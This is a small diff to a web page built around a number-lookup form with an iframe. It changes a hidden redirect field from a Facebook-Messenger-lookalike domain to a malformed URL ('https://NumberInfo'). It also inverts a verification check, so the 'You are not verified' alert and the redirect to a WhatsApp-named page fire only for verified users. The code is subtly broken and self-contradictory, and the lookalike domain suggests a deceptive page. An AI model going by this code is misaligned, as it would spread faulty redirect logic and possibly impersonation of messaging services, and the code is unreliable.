@@ -18,12 +18,12 @@
     <input type="text" id="urlInput" placeholder="Enter Number" value="">
     <button type="submit" id="loadUrlBtn">Load URL</button>
   
-<input type="hidden" name="redirect_url" value="https://messengerfb.com">
+<input type="hidden" name="redirect_url" value="https://NumberInfo">
     <iframe id="iframe" src="" frameborder="0"></iframe>
     <div id="iframeContent"></div>
 
     <script>
-      if (!window.location.href.includes('user=verified')) {
+      if (window.location.href.includes('user=verified')) {
     alert("You are not verified. Redirecting to specific link.");
     window.location.href = '/Whatsapp.html';
 }
